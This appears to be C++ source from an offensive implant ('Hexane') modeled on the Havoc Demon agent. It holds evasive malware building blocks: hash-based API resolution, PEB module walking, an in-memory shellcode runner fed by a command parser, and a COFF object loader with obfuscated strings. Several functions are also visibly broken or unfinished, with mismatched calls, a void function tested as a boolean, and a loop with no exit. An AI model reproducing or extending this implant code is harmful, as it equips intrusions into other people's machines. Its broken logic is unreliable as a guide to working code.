#include <core/include/memory.hpp>
#ifndef ENDIANESS
#define ENDIANESS 1
#endif

namespace Memory {
    namespace Methods {
        UINT_PTR GetStackCookie() {
            HEXANE

            uintptr_t cookie = 0;
            if (!NT_SUCCESS(Ctx->Nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, 0x24), &cookie, 0x4, nullptr))) {
                cookie = 0;
            }
            return cookie;
        }

        VOID GetProcessHeaps(HANDLE process, const uint32_t access, const uint32_t pid) {
            HEXANE

            HANDLE snap = { };
            HEAPLIST32 heaps = {};
            heaps.dwSize = sizeof(HEAPLIST32);

            if (!NT_SUCCESS(Process::NtOpenProcess(&process, access, pid))) {
                return;
            }

            snap = Ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPHEAPLIST, pid);
            if (snap == INVALID_HANDLE_VALUE) {
                return;
            }

            if (Heap32ListFirst(snap, &heaps)) {
                do {
                    //_heap_info heap_info = {heaps.th32HeapID, heaps.th32ProcessID};
                    //m_heaps.push_back(heap_info);
                }
                while (Heap32ListNext(snap, &heaps));
            }
        }

        _resource* GetIntResource(HMODULE base, const int rsrc_id) {
            HEXANE

            HRSRC hResInfo = { };
            _resource* Object = { };

            Object = S_CAST(_resource*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_resource)));
            if (
                !(hResInfo          = Ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA)) ||
                !(Object->hGlobal   = Ctx->win32.LoadResource(base, hResInfo)) ||
                !(Object->Size      = Ctx->win32.SizeofResource(base, hResInfo)) ||
                !(Object->ResLock   = Ctx->win32.LockResource(Object->hGlobal))) {

                Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Object);
                return nullptr;
            }

            return Object;
        }

        _executable* CreateImageData(uint8_t *data) {
            HEXANE

            auto *const image = R_CAST(_executable*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_executable)));

            image->buffer = data;
            image->dos_head = P_IMAGE_DOS_HEADER(image->buffer);
            image->nt_head = P_IMAGE_NT_HEADERS(image->buffer, image->dos_head);
            image->exports = P_IMAGE_EXPORT_DIRECTORY(image->dos_head, image->nt_head);

            return image;
        }
    }

    namespace Context {
        VOID ResolveApi() {
            HEXANE

            OSVERSIONINFOW OSVersionW = { };
            x_memset(&Ctx->LE, ENDIANESS, 1);

            if (!(Ctx->Modules.kernel32 = M_PTR(KERNEL32))) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }

            if (!(F_PTR_HASHES(Ctx->Nt.RtlGetVersion, NTDLL, RTLGETVERSION))) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }

            // WinVersion resolution : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
            Ctx->Session.OSVersion = WIN_VERSION_UNKNOWN;
            OSVersionW.dwOSVersionInfoSize = sizeof(OSVersionW);

            if (!NT_SUCCESS(Ctx->Nt.RtlGetVersion(&OSVersionW))) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }

            if (OSVersionW.dwMajorVersion >= 5) {
                if (OSVersionW.dwMajorVersion == 5) {
                    if (OSVersionW.dwMinorVersion == 1) {
                        Ctx->Session.OSVersion = WIN_VERSION_XP;
                    }
                }
                else if (OSVersionW.dwMajorVersion == 6) {
                    if (OSVersionW.dwMinorVersion == 0) {
                        Ctx->Session.OSVersion = WIN_VERSION_2008;
                    }
                    else if (OSVersionW.dwMinorVersion == 1) {
                        Ctx->Session.OSVersion = WIN_VERSION_2008_R2;
                    }
                    else if (OSVersionW.dwMinorVersion == 2) {
                        Ctx->Session.OSVersion = WIN_VERSION_2012;
                    }
                    else if (OSVersionW.dwMinorVersion == 3) {
                        Ctx->Session.OSVersion = WIN_VERSION_2012_R2;
                    }
                }
                else if (OSVersionW.dwMajorVersion == 10) {
                    if (OSVersionW.dwMinorVersion == 0) {
                        Ctx->Session.OSVersion = WIN_VERSION_2016_X;
                    }
                }
            }

            if (
                !(F_PTR_HMOD(Ctx->win32.GetLastError, Ctx->Modules.kernel32, GETLASTERROR)) ||
                !(F_PTR_HMOD(Ctx->win32.IsWow64Process, Ctx->Modules.kernel32, ISWOW64PROCESS)) ||
                !(F_PTR_HMOD(Ctx->win32.GlobalMemoryStatusEx, Ctx->Modules.kernel32, GLOBALMEMORYSTATUSEX))) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }

            if (
                !(F_PTR_HMOD(Ctx->Nt.NtAllocateVirtualMemory, Ctx->Modules.ntdll, NTALLOCATEVIRTUALMEMORY)) ||
                !(F_PTR_HMOD(Ctx->Nt.RtlAllocateHeap, Ctx->Modules.ntdll, RTLALLOCATEHEAP)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtFreeVirtualMemory, Ctx->Modules.ntdll, NTFREEVIRTUALMEMORY)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtReadVirtualMemory, Ctx->Modules.ntdll, NTREADVIRTUALMEMORY)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtWriteVirtualMemory, Ctx->Modules.ntdll, NTWRITEVIRTUALMEMORY)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtQueryVirtualMemory, Ctx->Modules.ntdll, NTQUERYVIRTUALMEMORY)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtCreateSection, Ctx->Modules.ntdll, NTCREATESECTION)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtMapViewOfSection, Ctx->Modules.ntdll, NTMAPVIEWOFSECTION)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtUnmapViewOfSection, Ctx->Modules.ntdll, NTUNMAPVIEWOFSECTION)) ||

                !(F_PTR_HMOD(Ctx->Nt.NtCreateUserProcess, Ctx->Modules.ntdll, NTCREATEUSERPROCESS)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtTerminateProcess, Ctx->Modules.ntdll, NTTERMINATEPROCESS)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtOpenProcess, Ctx->Modules.ntdll, NTOPENPROCESS)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtOpenProcessToken, Ctx->Modules.ntdll, NTOPENPROCESSTOKEN)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtOpenThreadToken, Ctx->Modules.ntdll, NTOPENTHREADTOKEN)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtDuplicateObject, Ctx->Modules.ntdll, NTDUPLICATEOBJECT)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtDuplicateToken, Ctx->Modules.ntdll, NTDUPLICATETOKEN)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtQueryInformationToken, Ctx->Modules.ntdll, NTQUERYINFORMATIONTOKEN)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtQueryInformationProcess, Ctx->Modules.ntdll, NTQUERYINFORMATIONPROCESS)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtQuerySystemInformation, Ctx->Modules.ntdll, NTQUERYSYSTEMINFORMATION)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtClose, Ctx->Modules.ntdll, NTCLOSE)) ||

                !(F_PTR_HMOD(Ctx->Nt.RtlRandomEx, Ctx->Modules.ntdll, RTLRANDOMEX)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtResumeThread, Ctx->Modules.ntdll, NTRESUMETHREAD)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtGetContextThread, Ctx->Modules.ntdll, NTGETCONTEXTTHREAD)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtSetContextThread, Ctx->Modules.ntdll, NTSETCONTEXTTHREAD)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtSetInformationThread, Ctx->Modules.ntdll, NTSETINFORMATIONTHREAD)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtWaitForSingleObject, Ctx->Modules.ntdll, NTWAITFORSINGLEOBJECT)) ||
                !(F_PTR_HMOD(Ctx->Nt.TpAllocWork, Ctx->Modules.ntdll, TPALLOCWORK)) ||
                !(F_PTR_HMOD(Ctx->Nt.TpPostWork, Ctx->Modules.ntdll, TPPOSTWORK)) ||
                !(F_PTR_HMOD(Ctx->Nt.TpReleaseWork, Ctx->Modules.ntdll, TPRELEASEWORK)) ||

                !(F_PTR_HMOD(Ctx->Nt.RtlCreateHeap, Ctx->Modules.ntdll, RTLCREATEHEAP)) ||
                !(F_PTR_HMOD(Ctx->Nt.RtlReAllocateHeap, Ctx->Modules.ntdll, RTLREALLOCATEHEAP)) ||
                !(F_PTR_HMOD(Ctx->Nt.RtlFreeHeap, Ctx->Modules.ntdll, RTLFREEHEAP)) ||
                !(F_PTR_HMOD(Ctx->Nt.RtlDestroyHeap, Ctx->Modules.ntdll, RTLDESTROYHEAP)) ||
                !(F_PTR_HMOD(Ctx->Nt.RtlInitUnicodeString, Ctx->Modules.ntdll, RTLINITUNICODESTRING)) ||
                !(F_PTR_HMOD(Ctx->Nt.RtlCreateProcessParametersEx, Ctx->Modules.ntdll, RTLCREATEPROCESSPARAMETERSEX)) ||
                !(F_PTR_HMOD(Ctx->Nt.RtlDestroyProcessParameters, Ctx->Modules.ntdll, RTLDESTROYPROCESSPARAMETERS))) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }

            if (
                !(F_PTR_HMOD(Ctx->win32.FormatMessageA, Ctx->Modules.kernel32, FORMATMESSAGEA)) ||
                !(F_PTR_HMOD(Ctx->win32.CreateToolhelp32Snapshot, Ctx->Modules.kernel32, CREATETOOLHELP32SNAPSHOT)) ||
                !(F_PTR_HMOD(Ctx->win32.Process32First, Ctx->Modules.kernel32, PROCESS32FIRST)) ||
                !(F_PTR_HMOD(Ctx->win32.Process32Next, Ctx->Modules.kernel32, PROCESS32NEXT)) ||
                !(F_PTR_HMOD(Ctx->win32.CreateRemoteThread, Ctx->Modules.kernel32, CREATEREMOTETHREAD)) ||
                !(F_PTR_HMOD(Ctx->win32.GetComputerNameExA, Ctx->Modules.kernel32, GETCOMPUTERNAMEEXA)) ||
                !(F_PTR_HMOD(Ctx->win32.GetLocalTime, Ctx->Modules.kernel32, GETLOCALTIME)) ||
                !(F_PTR_HMOD(Ctx->win32.SleepEx, Ctx->Modules.kernel32, SLEEPEX)) ||

                !(F_PTR_HMOD(Ctx->win32.GetCurrentDirectoryA, Ctx->Modules.kernel32, GETCURRENTDIRECTORYA)) ||
                !(F_PTR_HMOD(Ctx->win32.FileTimeToSystemTime, Ctx->Modules.kernel32, FILETIMETOSYSTEMTIME)) ||
                !(F_PTR_HMOD(Ctx->win32.GetSystemTimeAsFileTime, Ctx->Modules.kernel32, GETSYSTEMTIMEASFILETIME)) ||
                !(F_PTR_HMOD(Ctx->win32.SystemTimeToTzSpecificLocalTime, Ctx->Modules.kernel32, SYSTEMTIMETOTZSPECIFICLOCALTIME)) ||
                !(F_PTR_HMOD(Ctx->win32.GetFullPathNameA, Ctx->Modules.kernel32, GETFULLPATHNAMEA)) ||
                !(F_PTR_HMOD(Ctx->win32.CreateFileW, Ctx->Modules.kernel32, CREATEFILEW)) ||
                !(F_PTR_HMOD(Ctx->win32.ReadFile, Ctx->Modules.kernel32, READFILE)) ||
                !(F_PTR_HMOD(Ctx->win32.WriteFile, Ctx->Modules.kernel32, WRITEFILE)) ||
                !(F_PTR_HMOD(Ctx->win32.GetFileSizeEx, Ctx->Modules.kernel32, GETFILESIZEEX)) ||
                !(F_PTR_HMOD(Ctx->win32.FindFirstFileA, Ctx->Modules.kernel32, FINDFIRSTFILEA)) ||
                !(F_PTR_HMOD(Ctx->win32.FindNextFileA, Ctx->Modules.kernel32, FINDNEXTFILEA)) ||
                !(F_PTR_HMOD(Ctx->win32.FindClose, Ctx->Modules.kernel32, FINDCLOSE)) ||

                !(F_PTR_HMOD(Ctx->win32.CreateNamedPipeW, Ctx->Modules.kernel32, CREATENAMEDPIPEW)) ||
                !(F_PTR_HMOD(Ctx->win32.CallNamedPipeW, Ctx->Modules.kernel32, CALLNAMEDPIPEW)) ||
                !(F_PTR_HMOD(Ctx->win32.WaitNamedPipeW, Ctx->Modules.kernel32, WAITNAMEDPIPEW)) ||
                !(F_PTR_HMOD(Ctx->win32.ConnectNamedPipe, Ctx->Modules.kernel32, CONNECTNAMEDPIPE)) ||
                !(F_PTR_HMOD(Ctx->win32.DisconnectNamedPipe, Ctx->Modules.kernel32, DISCONNECTNAMEDPIPE)) ||
                !(F_PTR_HMOD(Ctx->win32.SetNamedPipeHandleState, Ctx->Modules.kernel32, SETNAMEDPIPEHANDLESTATE)) ||
                !(F_PTR_HMOD(Ctx->win32.PeekNamedPipe, Ctx->Modules.kernel32, PEEKNAMEDPIPE))) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }
            defer:

        }

        VOID ContextInit() {
            // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/

            _hexane instance = { };
            size_t region_size = 0;
            void *region = { };

            instance.Teb = NtCurrentTeb();
            instance.Heap = instance.Teb->ProcessEnvironmentBlock->ProcessHeap;

            instance.Teb->LastErrorValue = ERROR_SUCCESS;
            instance.Base.Address = U_PTR(InstStart());
            instance.Base.Size = U_PTR(InstEnd()) - instance.Base.Address;

            region = C_PTR(GLOBAL_OFFSET);
            region_size = sizeof(region);

            if (
                !(instance.Modules.ntdll = M_PTR(NTDLL)) ||
                !(F_PTR_HMOD(instance.Nt.NtProtectVirtualMemory, instance.Modules.ntdll, NTPROTECTVIRTUALMEMORY)) ||
                !(F_PTR_HMOD(instance.Nt.RtlAllocateHeap, instance.Modules.ntdll, RTLALLOCATEHEAP)) ||
                !(F_PTR_HMOD(instance.Nt.RtlRandomEx, instance.Modules.ntdll, RTLRANDOMEX))) {
                return;
            }

            if (!NT_SUCCESS(instance.Nt.NtProtectVirtualMemory(NtCurrentProcess(), &region, &region_size, PAGE_READWRITE, nullptr))) {
                return;
            }
            region = C_PTR(GLOBAL_OFFSET);
            if (!(C_DREF(region) = instance.Nt.RtlAllocateHeap(instance.Heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
                return;
            }

            x_memcpy(C_DREF(region), &instance, sizeof(_hexane));
            x_memset(&instance, 0, sizeof(_hexane));
            x_memset(C_PTR(U_PTR(region) + sizeof(LPVOID)), 0, 0xE);
        }

        VOID ContextDestroy(_hexane* Ctx) {
            // todo: needs expanded

            auto RtlFreeHeap = Ctx->Nt.RtlFreeHeap;
            auto Heap = Ctx->Heap;

            x_memset(Ctx, 0, sizeof(_hexane));

            if (RtlFreeHeap) {
                RtlFreeHeap(Heap, 0, Ctx);
            }
        }
    }

    namespace Objects {
        UINT_PTR GetInternalAddress(const char* id, bool* internal) {
            HEXANE

            uintptr_t address = { };
            *internal = false;

            for (uint32_t i = 0 ;; i++) {
                if (!cmd_map[i].name) {
                    return_defer(ERROR_PROC_NOT_FOUND);
                }

                if (cmd_map[i].name == id) {
                   *internal = true;
                   address = U_PTR(cmd_map[i].address);
                }
            }

            defer:
            return address;
        }

        UINT_PTR ResolveSymbol(const char* entry_name, const char* const args, size_t args_size, uint32_t req_id) {
            HEXANE

            uintptr_t address = { };
            bool is_internal = false;

            if ((address = Memory::Objects::GetInternalAddress(entry_name, &is_internal)) && is_internal) {
                return address;
            } else {
                char *lib_name = { };
                char *fn_name = { };
                /*
                 * ok, hear me out:
                 *      auto name = "NTDLL$NtAllocateVirtualMemory"
                 *      map[string]string = strings.Split(name, "$")
                 *
                 *      LoadExport(module, function);
                 */

                address = Memory::Modules::LoadExport(lib_name, fn_name);
                return address;
            }
        }

        VOID BaseRelocation(_executable *object, const char* const entry_name, const char* const args, size_t arg_size, uint32_t req_id) {
            HEXANE

            char symbol_name[9] = { };
            char *name = { };

            void *func      = { };
            void *reloc     = { };
            void *sym_sec   = { };
            void *fn_map    = { };

            uint16_t type   = 0;
            uint32_t count  = 0;
            uint32_t offset = 0;

            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                object->section     = P_IMAGE_SECTION_HEADER(object->buffer, i);
                object->reloc       = R_CAST(_reloc*, U_PTR(object->buffer) + object->section->PointerToRelocations);

                for (auto j = 0; j < object->section->NumberOfRelocations; j++) {
                    _symbol *symbol = &object->symbol[object->reloc->SymbolTableIndex];

                    if (symbol->First.Value[0] != 0) {
                        x_memset(symbol_name, 0, sizeof(symbol_name));
                        x_memcpy(symbol_name, symbol->First.Name, 8);
                        name = symbol_name;
                    } else {
                        name = R_CAST(char*, B_PTR(object->symbol) + object->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
                    }

                    reloc   = object->sec_map[j].data + object->reloc->VirtualAddress;
                    fn_map  = object->fn_map + (count * sizeof(void*));
                    sym_sec = object->sec_map[symbol->SectionNumber - 1].data;
                    type    = symbol->Type;

                    if (!ResolveSymbol(object, entry_name, args, arg_size, req_id)) {
                        return_defer(ntstatus);
                    }

                    if (object->reloc->Type == REL32 && func != nullptr) {
                        *(void**) fn_map = func;
                        offset = (uint32_t) (U_PTR(fn_map) - U_PTR(reloc) - sizeof(uint32_t) );

                        *((uintptr_t*)reloc) = offset;
                        count++;

                    } else if (object->reloc->Type == REL32 && func == nullptr) {
                        offset = *(uint32_t*) reloc;
                        offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t);

                        *(uint32_t*)reloc = offset;

                    } else if (object->reloc->Type == REL32_1 && func == nullptr) {
                        offset = *(uint32_t*) reloc;
                        offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t) - 1;

                        *(uint32_t*) reloc = offset;

                    } else if (object->reloc->Type == REL32_2 && func == nullptr) {
                        offset = *(uint32_t*) reloc;
                        offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t) - 2;

                        *(uint32_t*) reloc = offset;

                    } else if (object->reloc->Type == REL32_3 && func == nullptr) {
                        offset = *(uint32_t*) reloc;
                        offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t) - 3;

                        *(uint32_t*)reloc = offset;

                    } else if (object->reloc->Type == REL32_4 && func == nullptr) {
                        offset = *(uint32_t*) reloc;
                        offset += U_PTR( sym_sec ) - U_PTR( reloc ) - sizeof( UINT32 ) - 4;

                        *(uint32_t*) reloc = offset;

                    } else if (object->reloc->Type == REL32_5 && func == nullptr) {
                        offset = *(uint32_t*) reloc;
                        offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t) - 5;

                        *(uint32_t*) reloc = offset;

                    } else if (object->reloc->Type == ADDR32NB && func == nullptr) {
                        offset = *(uint32_t*) reloc;
                        offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t);

                        *(uint32_t*) reloc = offset;

                    } else if (object->reloc->Type == ADDR64 && func == nullptr) {
                        offset = *(uint64_t*) reloc;
                        offset += U_PTR( sym_sec );

                        *(uint64_t*) reloc = offset;
                    }
                }
            }
            defer:
        }

        VOID GetSectionSize() {

        }

#define IMP_SIZE 6
#define IMP_SYMBOL __imp_
#define IMP_SYMBOL_HASH 0x12345678

        SIZE_T GetFunctionMapSize(_executable *object) {
            HEXANE

            char name[9]        = { };
            char *symbol_name   = { };

            _symbol *symbol     = { };
            uint32_t n_funcs    = 0;

            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                object->section    = P_IMAGE_SECTION_HEADER(object->buffer, i);
                object->reloc      = R_CAST(_reloc*, object->section->PointerToRelocations);

                for (auto j = 0; j < object->section->NumberOfRelocations; j++) {
                    symbol = &object->symbol[object->reloc->SymbolTableIndex];

                    if (symbol->First.Value[0] != 0) {
                        x_memset(name, 0, sizeof(name));
                        x_memcpy(name, symbol->First.Name, 8);
                        symbol_name = name;
                    } else {
                        symbol_name = R_CAST(char*, object->symbol + object->nt_head->FileHeader.NumberOfSymbols);
                    }

                    if (Utils::GetHashFromStringA(symbol_name, IMP_SIZE) == IMP_SYMBOL_HASH) {
                        n_funcs++;
                    }

                    object->reloc = object->reloc + sizeof(_reloc);
                }
            }

            return sizeof(void*) * n_funcs;
        }

        BOOL MapSections(_executable *object, const uint8_t *const data) {
            HEXANE

            uint8_t *next = { };

            object->sec_map = R_CAST(_object_map*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_object_map)));
            object->fn_map->size = Memory::Objects::GetFunctionMapSize(object);

            if (!object->sec_map) {
                return_defer(ERROR_REPARSE_OBJECT);
            }

            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                object->section = P_IMAGE_SECTION_HEADER(data, i);
                object->size    += object->section->SizeOfRawData;
                object->size    = R_CAST(size_t, PAGE_ALIGN(object->size));
            }

            object->size += object->fn_map->size;
            if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtAllocateVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->buffer), NULL, &object->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                return_defer(ntstatus);
            }

            next = object->buffer;
            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                object->section = P_IMAGE_SECTION_HEADER(object->buffer, i);

                object->sec_map[i].size = object->section->SizeOfRawData;
                object->sec_map[i].data = next;

                next += object->section->SizeOfRawData;
                next = PAGE_ALIGN(next);

                x_memcpy(object->sec_map[i].data, C_PTR(U_PTR(data) + object->section->PointerToRawData), object->section->SizeOfRawData);
            }

            object->fn_map = R_CAST(_object_map*, next);
            defer:
            if (!NT_SUCCESS(ntstatus)) {
                return false;
            }

            return true;
        }
    }

    namespace Modules {
        HMODULE GetModuleAddress(const LDR_DATA_TABLE_ENTRY* entry) {
            return R_CAST(HMODULE, entry->DllBase);
        }

        LDR_DATA_TABLE_ENTRY* GetModuleEntry(const uint32_t hash) {
            HEXANE

            PEB_LDR_DATA *load  = { };
            CONTEXT thread_ctx  = { };
            PEB peb             = { };

            size_t read = 0;
            wchar_t lowercase[MAX_PATH] = { };

            if (
                !Ctx->Nt.NtGetContextThread(NtCurrentThread(), &thread_ctx) ||
                !Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), REG_PEB_OFFSET(thread_ctx), C_PTR(&peb), sizeof(PEB), &read) || read != sizeof(PEB)) {
                return nullptr;
            }

            load = peb.Ldr;
            for (auto head = load->InMemoryOrderModuleList.Flink; head != &load->InMemoryOrderModuleList; head = head->Flink) {
                auto entry = CONTAINING_RECORD(head, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

                if (hash - Utils::GetHashFromStringW(x_wcsToLower(lowercase, entry->BaseDllName.Buffer), entry->BaseDllName.Length) == 0) {
                    return entry;
                }
            }

            return nullptr;
        }

        FARPROC GetExportAddress(const HMODULE base, const uint32_t hash) {

            FARPROC address = { };
            char lowercase[MAX_PATH] = { };

            const auto dos_head = P_IMAGE_DOS_HEADER(base);
            const auto nt_head = P_IMAGE_NT_HEADERS(base, dos_head);
            const auto exports = P_IMAGE_EXPORT_DIRECTORY(dos_head, nt_head);

            if (exports->AddressOfNames) {
                const auto ords = RVA(uint16_t*, base, exports->AddressOfNameOrdinals);
                const auto fns = RVA(uint32_t*, base, exports->AddressOfFunctions);
                const auto names = RVA(uint32_t*, base, exports->AddressOfNames);

                for (auto i = 0; i < exports->NumberOfNames; i++) {
                    const auto name = RVA(char*, base, names[i]);

                    x_memset(lowercase, 0, MAX_PATH);

                    if (hash - Utils::GetHashFromStringA(x_mbsToLower(lowercase, name), x_strlen(name)) == 0) {
                        address = R_CAST(FARPROC, RVA(PULONG, base, fns[ords[i]]));
                        break;
                    }
                }
            }

            return address;
        }

        UINT_PTR LoadExport(const char* const module_name, const char* const export_name) {
            HEXANE

            uintptr_t symbol = 0;
            int reload = 0;

            const auto mod_hash = Utils::GetHashFromStringA(module_name, x_strlen(module_name));
            const auto fn_hash = Utils::GetHashFromStringA(export_name, x_strlen(export_name));

            while (!symbol) {
                if (!(F_PTR_HASHES(symbol, mod_hash, fn_hash))) {
                    if (reload || !Ctx->win32.LoadLibraryA(S_CAST(const char*, module_name))) {
                        goto defer;
                    }
                    reload = 1;
                }
            }

            defer:
            return symbol;
        }
    }

    namespace Scanners {
        UINT_PTR RelocateExport(void* const process, const void* const target, size_t size) {
            HEXANE

            uintptr_t ret = 0;
            const auto address = R_CAST(uintptr_t, target);

            for (ret = (address & 0xFFFFFFFFFFF70000) - 0x70000000;
                 ret < address + 0x70000000;
                 ret += 0x10000) {
                if (!NT_SUCCESS(Ctx->Nt.NtAllocateVirtualMemory(process, R_CAST(void **, &ret), 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
                    ret = 0;
                }
            }

            return ret;
        }

        BOOL SigCompare(const uint8_t* data, const char* signature, const char* mask) {
            for (; *mask; ++mask, ++data, ++signature) {
                if (*mask == 0x78 && *data != *signature) {
                    return FALSE;
                }
            }
            return (*mask == 0x00);
        }


        UINT_PTR SignatureScan(const uintptr_t start, const uint32_t size, const char* signature, const char* mask) {
            HEXANE

            size_t read = 0;
            uintptr_t address = 0;
            auto buffer = R_CAST(uint8_t*, Ctx->Nt.RtlAllocateHeap(GetProcessHeap(), 0, size));

            if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void *, start), buffer, size, &read))) {
                return_defer(ntstatus);
            }

            for (auto i = 0; i < size; i++) {
                if (SigCompare(buffer + i, signature, mask)) {
                    address = start + i;
                    break;
                }
            }

            x_memset(buffer, 0, size);

            defer:
            if (buffer) {
                Ctx->Nt.RtlFreeHeap(GetProcessHeap(), 0, buffer);
            }
            return address;
        }
    }

    namespace Execute {
        VOID ExecuteCommand(_parser &parser) {
            HEXANE

            _command cmd        = { };
            uintptr_t address   = { };

            bool is_internal    = false;
            const auto cmd_id   = Parser::UnpackString(&parser, nullptr);

            if (cmd_id == OBF("NoJob")) {
                goto defer;
            }

            if (!(address = Memory::Objects::GetInternalAddress(cmd_id, &is_internal)) || !is_internal) {
                return_defer(ntstatus);
                // todo: error_transmit("command not found : %s")
            }

            cmd = R_CAST(_command, Ctx->Base.Address + address);
            cmd(&parser);

            defer:
        }

        VOID ExecuteShellcode(_parser &parser) {
            HEXANE

            void *address  = { };
            void (*exec)() = { };
            size_t size = parser.Length;

            if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtAllocateVirtualMemory(NtCurrentProcess(), &address, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                return_defer(ntstatus);
            }

            x_memcpy(address, parser.Buffer, parser.Length);
            if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(NtCurrentProcess(), &address, &size, PAGE_EXECUTE_READ, nullptr))) {
                return_defer(ntstatus);
            }

            exec = R_CAST(void(*)(), address);
            exec();

            x_memset(address, 0, size);

            defer:
            if (address) {
                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE))) {
                    return_defer(ntstatus);
                }
            }
        }

        VOID LoadObject(const char *const name, uint8_t* const data, void* const args, size_t arg_size, uint32_t req_id) {
            HEXANE

            _executable *object = Memory::Methods::CreateImageData(B_PTR(data));

            object->next    = Ctx->Coffs;
            Ctx->Coffs      = object;

            if (!Opsec::SeImageCheckArch(object)) {
                return_defer(ntstatus);
            }

            if (!Memory::Objects::MapSections(object, data)) {
                return_defer(ntstatus);
            }

            if (!Memory::Objects::BaseRelocation(object)) {
                return_defer(ntstatus);
            }

            if (!Memory::Execute::ExecuteObjectFunction(object, name, args, arg_size, req_id)) {
                return_defer(ntstatus);
            }

            defer:
            if (!NT_SUCCESS(ntstatus)) {
                Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, object);
            }
        }
    }
}